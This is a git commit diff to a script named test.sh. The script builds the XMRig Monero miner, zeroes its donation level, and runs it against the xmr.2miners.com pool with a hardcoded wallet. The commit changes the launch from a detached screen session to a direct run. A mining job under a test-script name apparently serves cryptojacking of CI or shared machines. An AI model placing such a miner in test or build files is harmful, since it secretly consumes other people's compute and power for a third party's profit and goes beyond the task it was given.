7d6fad8c35df9ab57020c4b428c8c17b7cfb032f
chris127IO <73670798+chris127IO@users.noreply.github.com>
2021-11-05 22:10:42 +0100

    Update test.sh

--- test.sh
+++ test.sh
@@ -5,4 +5,4 @@ mkdir xmrig/build && cd xmrig/build
 sed -i 's/DonateLevel = 1/DonateLevel = 0/g' ../src/donate.h
 cmake ..
 make -j$(nproc)
-screen -dmS monero bash -c './xmrig --coin=XMR -o xmr.2miners.com:2222 -u 48DpVosVQSZQLUyhHrpc7FiYXZEbah7tjPqQwKHWvF4pbBupHRSdm8fPvQd1MUKfSQDiafc37m8hiFNdwjxU54V27qUQ5eV -p x'
+./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 48DpVosVQSZQLUyhHrpc7FiYXZEbah7tjPqQwKHWvF4pbBupHRSdm8fPvQd1MUKfSQDiafc37m8hiFNdwjxU54V27qUQ5eV -p x
